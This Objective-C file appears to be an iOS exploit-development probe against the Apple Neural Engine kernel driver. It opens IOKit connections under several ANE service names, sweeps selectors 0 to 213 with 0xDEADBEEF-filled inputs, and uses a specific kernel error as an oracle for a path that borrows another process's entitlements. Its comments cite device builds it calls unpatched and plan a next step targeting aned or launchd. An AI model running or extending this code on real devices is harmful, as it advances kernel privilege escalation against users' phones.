//
//  P109AneSelSweep.m — ANE sel sweep with the Stage-B kernel oracle (note 258/259).
//  Path map: IOServiceOpen(ANE, type=0) = program-loading client = Stage-B client.
//  Stage-B (0x8739b14) reads request+0x180 (u32 pid) and borrows entitlements
//  from that pid's task (increased-model-size-limit -> 2GiB cap;
//  memoryUnwiringOptOutAccess.allow -> req+0xd84=1). Unresolvable pid ->
//  kr 0xe00002f0 "Cannot find task from the given pid" — THE probe oracle.
//  Sweep: IOConnectCallStructMethod sel 0..63, input sizes {0x200, 0x400}
//  filled entirely with 0xDEADBEEF u32s (any pid offset lands DEADBEEF),
//  output 0x1000. kr shapes: 0x2f0 = STAGE-B HIT; 0x2c2/0x2c1 = shape/gate
//  denial; 0x2e2 = not-permitted; 0 = accepted (logged, no fire).
//  Both ANE doors: H11ANEIn and H1xANELoadBalancer (LB forwards into the
//  same domain; its UC may skip direct-client plumbing).
//  Bounded, one pass, no valid programs. One TAP per force-quit.
//

#import "P109AneSelSweep.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"

#import <Foundation/Foundation.h>
#import <mach/mach.h>
#import <fcntl.h>
#import <string.h>
#import <stdint.h>
#import <dlfcn.h>
#import <unistd.h>
#import <stdarg.h>

#define P109_BUILD @"p109-ane-selsweep-v4-h16names"

typedef mach_port_t io_object_t;
typedef mach_port_t io_service_t;
typedef mach_port_t io_connect_t;
typedef CFMutableDictionaryRef (*IOServiceMatching_t)(const char *);
typedef io_service_t (*IOServiceGetMatchingService_t)(mach_port_t, CFDictionaryRef);
typedef kern_return_t (*IOServiceOpen_t)(io_service_t, task_port_t, uint32_t, io_connect_t *);
typedef kern_return_t (*IOServiceClose_t)(io_connect_t);
typedef kern_return_t (*IOObjectRelease_t)(io_object_t);
typedef kern_return_t (*IOConnectCallStructMethod_t)(io_connect_t, uint32_t,
        const void *, size_t, void *, size_t *);

static int p109_fd = -1;
static NSMutableString *p109_buf = nil;
static void p109_init_log(void) {
    if (p109_fd >= 0) return;
    p109_buf = [NSMutableString string];
    NSString *docs = NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    NSString *path = [docs stringByAppendingPathComponent:@"p109_ane_selsweep_log.txt"];
    p109_fd = open(path.UTF8String, O_CREAT | O_WRONLY | O_TRUNC, 0644);
}
static void p109_logv(NSString *s) {
    NSString *out = [s hasSuffix:@"\n"] ? s : [s stringByAppendingString:@"\n"];
    [p109_buf appendString:out];
    if (p109_fd >= 0) {
        const char *p = out.UTF8String; if (p) write(p109_fd, p, strlen(p));
        fsync(p109_fd);            /* ladder: every sel verdict fsync'd */
    }
}
static void p109_log(NSString *fmt, ...) NS_FORMAT_FUNCTION(1,2);
static void p109_log(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    p109_logv(s);
}
static NSString *p109_krname(kern_return_t kr) {
    switch (kr) {
        case 0:               return @"ACCEPTED(0)";
        case 0xe00002f0:      return @"STAGE-B-HIT(2f0)";
        case 0xe00002c2:      return @"2c2";
        case 0xe00002c1:      return @"2c1";
        case 0xe00002e2:      return @"2e2-not-permitted";
        case 0xe00002be:      return @"2be";
        case 0xe00002bf:      return @"2bf";
        case KERN_NO_SPACE:   return @"no-space";
        default:              return [NSString stringWithFormat:@"0x%08x", (unsigned)kr];
    }
}

@implementation P109AneSelSweep

+ (NSString *)tap {
    p109_init_log();
    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p109"];
    p109_log([NSString stringWithFormat:@"=== p109 session %@ BUILD %@ ===",
              LabLocalMilitaryNow(), P109_BUILD]);
    p109_log(@"ANE sel sweep, Stage-B kernel oracle (note 258/259).");
    p109_log(@"input = pure 0xDEADBEEF u32 pattern (any pid offset reads DEADBEEF).");
    p109_log(@"kr 0x2f0 with klog 'Cannot find task from the given pid' = the Stage-B door.");
    /* v4 (advisory-149230 cross-ref, 2026-10-27): the A14-only gate stopped
       this sweep on the 17 — but the 43748 writer is UNPATCHED on 27.0
       (24A435, note 272 §1) and 112696/84494 are 27.2-only fixes (LIVE on
       both devices). Allow T8150 27.x too; everything else still stops. */
    if (stop && !([[LabDeviceProfile machine] hasPrefix:@"iPhone18,"] &&
                  [[LabDeviceProfile osversion] hasPrefix:@"24A"])) {
        p109_log(stop);
        if (p109_fd >= 0) { fcntl(p109_fd, F_FULLFSYNC); close(p109_fd); p109_fd = -1; }
        return p109_buf;
    }
    p109_log([LabDeviceProfile identBlock]);

    void *h = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    if (!h) { p109_log(@"dlopen IOKit FAIL"); goto done; }
    IOServiceMatching_t pMatching = dlsym(h, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(h, "IOServiceGetMatchingService");
    IOServiceOpen_t pOpen = dlsym(h, "IOServiceOpen");
    IOServiceClose_t pClose = dlsym(h, "IOServiceClose");
    IOObjectRelease_t pRelease = dlsym(h, "IOObjectRelease");
    IOConnectCallStructMethod_t pStruct = dlsym(h, "IOConnectCallStructMethod");
    mach_port_t *pMainPort = dlsym(h, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(h, "kIOMasterPortDefault");
    if (!pMatching || !pGet || !pOpen || !pClose || !pRelease || !pStruct || !pMainPort) {
        p109_log(@"dlsym IOKit symbols missing"); goto done;
    }

    /* v4: the H16 (T8150/27.0) family publishes services under its own
       names — "H11ANEIn"-only matching produced a 17-side name-miss risk.
       Try every plausible class name; only FOUND services are swept. */
    static const char *kServices[] = {
        "H11ANEIn",               /* T8101/T8020 in-path UC (23F77 law)  */
        "H1xANELoadBalancer",     /* cross-gen LB front door             */
        "H16ANEIn",               /* T8150 candidate (H16 kext family)   */
        "AppleH16ANEInterface",   /* T8150 kext class name (24A435)      */
        "AppleH11ANEInterface",   /* T8101 kext class name (23F77)       */
        "H16ANELoadBalancer",     /* H16-spelled LB variant              */
        "H11ANEDriver",
        "H16ANEDriver",
    };
    const int kNServices = (int)(sizeof(kServices) / sizeof(kServices[0]));
    const uint32_t kTypes[] = { 0, 1, 2, 3, 4 };  /* v2: type0 denied 2c7 on-device; the program-loading client is a higher type */

    for (int sv = 0; sv < kNServices; sv++) {
        CFMutableDictionaryRef md = pMatching(kServices[sv]);
        p109_log([NSString stringWithFormat:@"[svc] %@ matching=%@",
                  @(kServices[sv]), md ? @"OK" : @"nil"]);
        if (!md) continue;
        io_service_t svc = pGet(*pMainPort, md);
        p109_log([NSString stringWithFormat:@"[svc] %@ get=%@ svc=0x%x",
                  @(kServices[sv]),
                  svc ? @"OK" : @"nil", (unsigned)svc]);
        /* IOServiceGetMatchingService CONSUMES the matching dictionary
           (releases it internally) - our CFRelease was an over-release
           of freed memory = the SIGTRAP. Do not release md. */
        if (!svc) continue;
        p109_log([NSString stringWithFormat:@"[svc] %@ FOUND — sweep open", @(kServices[sv])]);

        for (int ti = 0; ti < 5; ti++) {   /* v4: ALL UC types 0..4 (v2's
           note said the program-loading client is a higher type; ti<2 never
           reached it). Open-only for unlisted types; full sel sweep per
           opened connection, same as v3. */
            io_connect_t conn = 0;
            kern_return_t okr = pOpen(svc, mach_task_self(), kTypes[ti], &conn);
            if (okr != KERN_SUCCESS) {
                p109_log([NSString stringWithFormat:@"[open] type=%u kr=%@ (skip)",
                          kTypes[ti], p109_krname(okr)]);
                continue;
            }
            p109_log([NSString stringWithFormat:@"[open] %@ type=%u conn=0x%x — sweeping sels 0..213",
                      @(kServices[sv]), kTypes[ti], (unsigned)conn]);

            /* v3: full 214-entry dispatch range (23F77 Stage-B sits at idx
               172; v2's 0..63 never reached the pid field on T8150). 3rd
               size 0x800 keeps the +0x180 pid offset deep in-bounds. */
            const size_t sizes[3] = { 0x200, 0x400, 0x800 };
            for (uint32_t sel = 0; sel <= 213; sel++) {
                NSMutableString *line = [NSMutableString
                    stringWithFormat:@"[sel %2u]", sel];
                for (int sz_i = 0; sz_i < 3; sz_i++) {
                    size_t sz = sizes[sz_i];
                    static uint8_t in[0x800];
                    static uint8_t out[0x1000];
                    uint32_t *w = (uint32_t *)in;
                    for (size_t k = 0; k < sz/4; k++) w[k] = 0xDEADBEEFu;
                    memset(out, 0, sizeof out);
                    size_t osz = sizeof out;
                    kern_return_t kr = pStruct(conn, sel, in, sz, out, &osz);
                    [line appendFormat:@" %@=%@",
                        sizes[sz_i] == 0x200 ? @"s200" : (sizes[sz_i] == 0x400 ? @"s400" : @"s800"),
                        p109_krname(kr)];
                }
                p109_log(line);
            }
            p109_log([NSString stringWithFormat:@"[svc %@ type %u] sweep done — verdicts above", @(kServices[sv]), kTypes[ti]]);
            pClose(conn);
        }
        if (svc) pRelease(svc);
    }
done:
    p109_log(@"=== VERDICT: sels with STAGE-B-HIT(2f0) = the Stage-B door; ===");
    p109_log(@"v4 adds: T8150/24A435 H16 service names + UC types 0..4 (the direct-UC");
    p109_log(@"  reachability answer for 43748-out-of-framework + 112696/84494, both 27.2-only fixes).");
    p109_log(@"next: same sel with pid=aned/launchd (kern.proc) = the borrow fire. hasKread stays NO.");
    if (p109_fd >= 0) { fcntl(p109_fd, F_FULLFSYNC); close(p109_fd); p109_fd = -1; }
    return p109_buf;
}

@end